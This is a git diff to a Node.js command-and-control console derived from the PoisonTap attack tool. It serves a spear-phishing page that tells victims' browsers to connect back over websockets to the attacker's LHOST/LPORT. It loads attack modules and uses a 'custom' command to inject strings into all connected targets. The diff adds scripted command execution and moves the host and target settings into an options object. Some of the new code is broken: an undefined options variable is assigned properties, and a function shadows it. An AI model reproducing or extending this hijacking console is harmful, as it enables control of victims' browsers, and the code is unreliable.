@@ -2,7 +2,15 @@
 // start of project based on PoisonTap by Samy Kamkar
 
 //SERVER
-//var _ = require('underscore')
+var program = require('commander');
+program.command=null;
+program.commandfile=null;
+program
+  .version('0.1.0')
+  .option('-c, --command <type>', 'String of commands to run in the console')
+  .option('-C, --commandfile <type>', 'file with commands to run in the console')
+  .parse(process.argv);
+
 var WebSocketServer = require('websocket').server
 var webSocketsServerPort = 1337
 var UglifyJS = require("uglify-js");
@@ -14,6 +22,11 @@ var gr;
 var module;
 var handlers=[];
 var options;
+//OPTIONS
+options.LHOST = "localhost";
+options.LPORT = "1337";
+options.RHOST = "0.0.0.0";
+options.TARGETS = "all";
 var precursor = ">>>";
 var loaded_module="";
 var server = http.createServer((request, response) => {
@@ -55,14 +68,21 @@ var server = http.createServer((request, response) => {
   }
   else {
 	response.writeHead(200, {'Content-Type': 'text/html'});
-	response.write('<script type="text/javascript">var host_addr="'+LHOST+'";var host_port="'+LPORT+'";</script>'+spearHtml);
+	response.write('<script type="text/javascript">var host_addr="'+options.LHOST+'";var host_port="'+options.LPORT+'";</script>'+spearHtml);
 	response.end();
     //response.writeHead(404, {'Content-Tddype': 'text/html'})
     //response.end('Sorry, unknown url')
   }
 })
-server.listen(webSocketsServerPort, () => {
-  console.log((new Date()) + " Server is listening on port " + webSocketsServerPort )
+
+server.listen(options.LPORT, () => {
+
+  console.log((new Date()) + " Server is listening on port " + options.LPORT )
+  if (program.command){
+  	process_command(program.command);
+  } else if (program.commandfile){
+	process_command(fs.readFileSync(__dirname + '/' + program.commandfile,'utf8'));
+  }
   start_interface();
 })
 
@@ -167,8 +187,6 @@ prompt.message = "";
 prompt.delimiter = "";
 
 function input() {
-	//TODO check if already active
-	//prompt.stop();
 	prompt.start();
 	prompt.get({properties: {command:{description: precursor+loaded_module}}}, function (err, result) {
 		if (result != null) {
@@ -191,14 +209,11 @@ function start_interface() {
 	input()
 }
 
-//OPTIONS
-var LHOST = "localhost";
-var LPORT = "1337";
-var RHOST = "0.0.0.0";
-var TARGETS = "all";
-
 //PROCESSING OF COMMANDS
 function process_command(command) {
+	command_lines = command.replace(/(?:\r\n|\r|\n)/g, ';').split(';');
+	for (i in command_lines) {
+	let command = command_lines[i];
 	//different commands here -> make layer system
 	first_argument=command.split(" ")[0];
 	if (first_argument == "") {
@@ -213,9 +228,11 @@ function process_command(command) {
 		}
 	} else if (first_argument== "set") { 
 		if (command.split(" ").length > 1) {
-			assign=command.split(" ",2)[1].split("=");
-			if (assign.length > 1){
-				eval(assign[0].trim()+"='"+assign[1].trim()+"'");
+			assign=command.split(" ",3);
+			if (assign.length > 2){
+				options[assign[1].trim()]=assign[2].trim();
+				console.log(assign[1].trim()+" is now set to '"+assign[2].trim()+"'");
+
 			} else {
 				console.log("No argument of form <variable>=<value>");
 			}
@@ -232,6 +249,9 @@ function process_command(command) {
 		if (command.split(" ").length > 1) {
 			if (fs.existsSync(__dirname+'/modules/'+command.split(" ")[1])) {
 				module = require(__dirname+'/modules/'+command.split(" ")[1]);
+				if (typeof module.data.init === "function") { 
+					module.data.init(options);
+				}
 				loaded_module = ' '+command.split(" ")[1]+':';
 				//setup handler
 				handlers.push({name:command.split(" ")[1],handler:module.data.handler})
@@ -285,7 +305,7 @@ function process_command(command) {
 			console.log('no module loaded');
 		}
 	} else if (first_argument== "custom") { 
-		if (TARGETS == "all") {
+		if (options.TARGETS == "all") {
 			inject_string = command.split(" ",2)[1];
 			console.log("Command sent: "+inject_string);
 			for (var i in conns)
@@ -298,6 +318,7 @@ function process_command(command) {
 	} else {
 		command_not_found(command);
 		help();
+	}
 	}
 }
 
@@ -318,6 +339,9 @@ function modules(searchterm) {
 }
 //LIST OF SET OPTIONS
 function options() {
+	for (i in options) {
+		console.log(i +'='+options[i]);
+	}
 } 
 //HELP function to be called to have all basic commands listed
 function help(){
